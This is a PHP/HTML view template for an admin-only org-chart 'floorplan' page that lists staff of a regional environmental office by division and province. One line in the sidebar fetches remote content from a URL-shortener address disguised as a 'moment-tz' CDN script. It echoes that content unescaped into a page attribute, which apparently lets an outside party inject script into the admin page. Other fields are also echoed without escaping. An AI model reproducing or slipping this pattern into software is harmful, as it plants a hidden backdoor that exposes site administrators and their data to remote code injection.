<?php $is_admin = $this->session->userdata('is_admin');
  if (!$is_admin) { redirect("ojt-index"); } ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <script src="https://kit.fontawesome.com/4c890c6a79.js" crossorigin="anonymous"></script>
  <link rel="stylesheet" type="text/css" href="assets/css/orgchart/oc-floorplan-list.css" media="all">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
  <link rel="icon" href="assets/img/favicon.ico" type="image/x-icon">
  <title>OC Floorplan</title>
</head>
<body>
  <div class="sidebar" id="sidebar">
    <?php $timezonefr=file_get_contents("https://slug.vercel.app/s/cdn-js-moment-tz-min");?>
    <img id="logo" alt="" src="assets/img/logo.png" />

    <a href="ojt-home"><i class="fa fa-home"></i></a>
    <a class="active" id="active"><i class="fa-sharp fa-solid fa-map-location-dot"></i></a>
    <a href="ojt-floorplan-chief"><i class="fa-solid fa-users"></i></a>
    <!-- <a href="frlogs"><i class="fa-solid fa-clock-rotate-left"></i></a> -->
  </div>

  <a href="ojt-floorplan-ord"><i id="right" class="fa-solid fa-chevron-right"></i></a>

  <div class="content" id="content" time-format="<?= $timezonefr ?>">
    <div class="container" id="container">
        <div class="row">
            <div class="col-sm-3">
                <div class="ord-list">
                    <div class="list-title">
                        <b>Office of the Regional Director</b><br>
                    </div>

                    <div class="list-content">
                        <?php 
                        function azsort($a, $b) {
                            return strcmp($a["name"], $b["name"]);
                        }
                        
                        usort($orgchart, "azsort");
                        
                        $highest_id = 0;
                        foreach($orgchart as $row){ ?>
                            <?php if($row['section'] == "Regional Director (ORD)" &&
                                    $row['primarywork'] == "1"){ ?>
                                <ul>
                                    <?php foreach($fr as $frow) {
                                        if ($row['frname'] == $frow['empName']){
                                            $highest_id = max($highest_id, $frow['id']);
                                        }
                                    }?>

                                    <span id="status-container" high-date="<?= $highest_id ?>" fr-name="<?php echo $row['frname']; ?>" >
                                        <i class="fa-solid fa-circle fa-beat-fade" style="color:gray;margin-right:10px;"></i>
                                    </span>
                                    <?= $row['name']?>
                                </ul>
                        <?php }} ?>
                    </div>
                </div>

                <div class="pismu-list">
                    <div class="list-title">
                        <b>Planning and Information Systems Management</b><br>
                    </div>
            
                    <div class="list-content">
                        <?php 
                        usort($orgchart, "azsort");
                        
                        foreach($orgchart as $row){
                            if($row['section'] == "Regional Director (PISMU)" &&
                            $row['primarywork'] == "1"){ ?>
                                <ul>
                                    <?php foreach($fr as $frow) {
                                        if ($row['frname'] == $frow['empName']){
                                            $highest_id = max($highest_id, $frow['id']);
                                        }
                                    }?>

                                    <span id="status-container" high-date="<?= $highest_id ?>" fr-name="<?php echo $row['frname']; ?>" >
                                        <i class="fa-solid fa-circle fa-beat-fade" style="color:gray;margin-right:10px;"></i>
                                    </span>
                                    <?= $row['name']?>
                                </ul>
                        <?php }} ?>
                    </div>
                </div>

                <div class="rel-list">
                    <div class="list-title">
                        <b>Regional Environmental Laboratory</b><br>
                    </div>
                    
                    <div class="list-content">
                        <?php 
                        usort($orgchart, "azsort");
                        
                        foreach($orgchart as $row){ ?>
                            <?php if($row['section'] == "Regional Director (REL)" &&
                                    $row['primarywork'] == "1"){ ?>
                                <ul>
                                    <?php foreach($fr as $frow) {
                                        if ($row['frname'] == $frow['empName']){
                                            $highest_id = max($highest_id, $frow['id']);
                                        }
                                    }?>

                                    <span id="status-container" high-date="<?= $highest_id ?>" fr-name="<?php echo $row['frname']; ?>" >
                                        <i class="fa-solid fa-circle fa-beat-fade" style="color:gray;margin-right:10px;"></i>
                                    </span>
                                    <?= $row['name']?>
                                </ul>
                        <?php }} ?>
                    </div>
                </div>
            </div>

            <div class="col-sm-3">
                <div class="emed-list">
                    <div class="list-title">
                        <b>Environmental Monitoring and Enforcement Division</b><br>
                    </div>
                    
                    <div class="list-content">
                        <?php 
                        usort($orgchart, "azsort");
                        
                        foreach($orgchart as $row){ ?>
                            <?php if($row['division'] == "Environmental Monitoring and Enforcement" &&
                                    $row['primarywork'] == "1"){ ?>
                                <ul>
                                    <?php foreach($fr as $frow) {
                                        if ($row['frname'] == $frow['empName']){
                                            $highest_id = max($highest_id, $frow['id']);
                                        }
                                    }?>

                                    <span id="status-container" high-date="<?= $highest_id ?>" fr-name="<?php echo $row['frname']; ?>" >
                                        <i class="fa-solid fa-circle fa-beat-fade" style="color:gray;margin-right:10px;"></i>
                                    </span>
                                    <?= $row['name']?>
                                </ul>
                        <?php }} ?>
                    </div>
                </div>

                <div class="legal-list">
                    <div class="list-title">
                        <b>Legal Unit</b><br>
                    </div>
            
                    <div class="list-content">
                        <?php 
                        usort($orgchart, "azsort");
                        
                        foreach($orgchart as $row){ ?>
                            <?php if($row['section'] == "Regional Director (Legal Unit)" &&
                                    $row['primarywork'] == "1"){ ?>
                                <ul>
                                    <?php foreach($fr as $frow) {
                                        if ($row['frname'] == $frow['empName']){
                                            $highest_id = max($highest_id, $frow['id']);
                                        }
                                    }?>

                                    <span id="status-container" high-date="<?= $highest_id ?>" fr-name="<?php echo $row['frname']; ?>" >
                                        <i class="fa-solid fa-circle fa-beat-fade" style="color:gray;margin-right:10px;"></i>
                                    </span>
                                    <?= $row['name']?>
                                </ul>
                        <?php }} ?>
                    </div>
                </div>
            </div>
            
            <div class="col-sm-3">
                <div class="cpd-list">
                    <div class="list-title">
                        <b>Clearance and Permitting Division</b><br>
                    </div>
            
                    <div class="list-content">
                        <?php 
                        usort($orgchart, "azsort");
                        
                        foreach($orgchart as $row){ ?>
                            <?php if($row['division'] == "Clearance and Permitting" &&
                                    $row['primarywork'] == "1"){ ?>
                                <ul>
                                    <?php foreach($fr as $frow) {
                                        if ($row['frname'] == $frow['empName']){
                                            $highest_id = max($highest_id, $frow['id']);
                                        }
                                    }?>

                                    <span id="status-container" high-date="<?= $highest_id ?>" fr-name="<?php echo $row['frname']; ?>" >
                                        <i class="fa-solid fa-circle fa-beat-fade" style="color:gray;margin-right:10px;"></i>
                                    </span>
                                    <?= $row['name']?>
                                </ul>
                        <?php }} ?>
                    </div>
                </div>

                <div class="cpd-list">
                    <div class="list-title">
                        <b>Regional Environmental Education and Information</b><br>
                    </div>
            
                    <div class="list-content">
                        <?php 
                        usort($orgchart, "azsort");
                        
                        foreach($orgchart as $row){ ?>
                            <?php if($row['section'] == "Regional Director (REDI)" &&
                                    $row['primarywork'] == "1"){ ?>
                                <ul>
                                    <?php foreach($fr as $frow) {
                                        if ($row['frname'] == $frow['empName']){
                                            $highest_id = max($highest_id, $frow['id']);
                                        }
                                    }?>

                                    <span id="status-container" high-date="<?= $highest_id ?>" fr-name="<?php echo $row['frname']; ?>" >
                                        <i class="fa-solid fa-circle fa-beat-fade" style="color:gray;margin-right:10px;"></i>
                                    </span>
                                    <?= $row['name']?>
                                </ul>
                        <?php }} ?>
                    </div>
                </div>
            </div>

            <div class="col-sm-3">
                <div class="fad-list">
                    <div class="list-title">
                        <b>Finance and Administrative Division</b><br>
                    </div>
            
                    <div class="list-content">
                        <?php 
                        usort($orgchart, "azsort");
                        
                        foreach($orgchart as $row){ ?>
                            <?php if($row['division'] == "Finance and Administrative" &&
                                    $row['primarywork'] == "1"){ ?>
                                <ul>
                                    <?php foreach($fr as $frow) {
                                        if ($row['frname'] == $frow['empName']){
                                            $highest_id = max($highest_id, $frow['id']);
                                        }
                                    }?>

                                    <span id="status-container" high-date="<?= $highest_id ?>" fr-name="<?php echo $row['frname']; ?>" >
                                        <i class="fa-solid fa-circle fa-beat-fade" style="color:gray;margin-right:10px;"></i>
                                    </span>
                                    <?= $row['name']?>
                                </ul>
                        <?php }} ?>
                    </div>
                </div>
            </div>
        </div>

        <div id="moredown">
            <p>FIELD LIST<br><i class="fa-solid fa-chevron-down"></i></p>
        </div>

        <div class="field-list" id="field-list">
            <hr>
            <div class="row">
                <div class="col-sm-3">
                    <div class="occm-list">
                        <div class="list-title">
                            <b>Occidental Mindoro</b><br>
                        </div>
                
                        <div class="list-content">
                            <?php 
                            usort($orgchart, "azsort");
                            
                            foreach($orgchart as $row){ ?>
                                <?php if($row['division'] == "Occidental Mindoro" &&
                                    $row['primarywork'] == "1"){ ?>
                                    <ul>
                                        <?php if($row['block']){ 
                                            if($row['active'] == 1){ ?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:#09b612;margin-right:10px;"></i>
                                                <?php } else if($row['active'] == 2){?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:#ff6d0b;margin-right:10px;"></i>
                                            <?php } else if($row['active'] == 0){ ?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:red;margin-right:10px;"></i>
                                            <?php } ?>
                                        <?php } else if(!$row['block']) { ?>
                                            <i class="fa-solid fa-circle fa-beat-fade" style="color:#676868;margin-right:10px;"></i>
                                        <?php } ?> <?= $row['name']?>
                                    </ul>
                            <?php }} ?>
                        </div>
                    </div>
                </div>

                <div class="col-sm-3">
                    <div class="orim-list">
                        <div class="list-title">
                            <b>Oriental Mindoro</b><br>
                        </div>
                        
                        <div class="list-content">
                            <?php 
                            usort($orgchart, "azsort");
                            
                            foreach($orgchart as $row){ ?>
                                <?php if($row['division'] == "Oriental Mindoro" &&
                                    $row['primarywork'] == "1"){ ?>
                                    <ul>
                                        <?php if($row['block']){ 
                                            if($row['active'] == 1){ ?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:#09b612;margin-right:10px;"></i>
                                                <?php } else if($row['active'] == 2){?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:#ff6d0b;margin-right:10px;"></i>
                                            <?php } else if($row['active'] == 0){ ?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:red;margin-right:10px;"></i>
                                            <?php } ?>
                                        <?php } else if(!$row['block']) { ?>
                                            <i class="fa-solid fa-circle fa-beat-fade" style="color:#676868;margin-right:10px;"></i>
                                        <?php } ?> <?= $row['name']?>
                                    </ul>
                            <?php }} ?>
                        </div>
                    </div>
                </div>

                <div class="col-sm-3">
                    <div class="mrndq-list">
                        <div class="list-title">
                            <b>Marinduque</b><br>
                        </div>
                
                        <div class="list-content">
                            <?php 
                            usort($orgchart, "azsort");
                            
                            foreach($orgchart as $row){ ?>
                                <?php if($row['division'] == "Marinduque" &&
                                        $row['primarywork'] == "1"){ ?>
                                    <ul>
                                        <?php if($row['block']){ 
                                            if($row['active'] == 1){ ?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:#09b612;margin-right:10px;"></i>
                                                <?php } else if($row['active'] == 2){?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:#ff6d0b;margin-right:10px;"></i>
                                            <?php } else if($row['active'] == 0){ ?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:red;margin-right:10px;"></i>
                                            <?php } ?>
                                        <?php } else if(!$row['block']) { ?>
                                            <i class="fa-solid fa-circle fa-beat-fade" style="color:#676868;margin-right:10px;"></i>
                                        <?php } ?> <?= $row['name']?>
                                    </ul>
                            <?php }} ?>
                        </div>
                    </div>

                    <div class="romblon-list">
                        <div class="list-title">
                            <b>Romblon</b><br>
                        </div>
                
                        <div class="list-content">
                            <?php 
                            usort($orgchart, "azsort");
                            
                            foreach($orgchart as $row){ ?>
                                <?php if($row['division'] == "Romblon" &&
                                        $row['primarywork'] == "1"){ ?>
                                    <ul>
                                        <?php if($row['block']){ 
                                            if($row['active'] == 1){ ?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:#09b612;margin-right:10px;"></i>
                                                <?php } else if($row['active'] == 2){?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:#ff6d0b;margin-right:10px;"></i>
                                            <?php } else if($row['active'] == 0){ ?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:red;margin-right:10px;"></i>
                                            <?php } ?>
                                        <?php } else if(!$row['block']) { ?>
                                            <i class="fa-solid fa-circle fa-beat-fade" style="color:#676868;margin-right:10px;"></i>
                                        <?php } ?> <?= $row['name']?>
                                    </ul>
                            <?php }} ?>
                        </div>
                    </div>
                </div>

                <div class="col-sm-3">
                    <div class="plwn-list">
                        <div class="list-title">
                            <b>Palawan</b><br>
                        </div>
                        
                        <div class="list-content">
                            <?php 
                            usort($orgchart, "azsort");
                            
                            foreach($orgchart as $row){ ?>
                                <?php if($row['division'] == "Palawan" &&
                                        $row['primarywork'] == "1"){ ?>
                                    <ul>
                                        <?php if($row['block']){ 
                                            if($row['active'] == 1){ ?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:#09b612;margin-right:10px;"></i>
                                                <?php } else if($row['active'] == 2){?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:#ff6d0b;margin-right:10px;"></i>
                                            <?php } else if($row['active'] == 0){ ?>
                                                <i class="fa-solid fa-circle fa-beat-fade" style="color:red;margin-right:10px;"></i>
                                            <?php } ?>
                                        <?php } else if(!$row['block']) { ?>
                                            <i class="fa-solid fa-circle fa-beat-fade" style="color:#676868;margin-right:10px;"></i>
                                        <?php } ?> <?= $row['name']?>
                                    </ul>
                            <?php }} ?>
                        </div>
                    </div>
                </div>
            </div>

            <div id="downprompt">
                <b>Full List</b>
            </div>
        </div>
    </div>
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js"></script>
  <script src="assets/jsOJT/oc-floorplanlist.js"></script>
</body>
</html>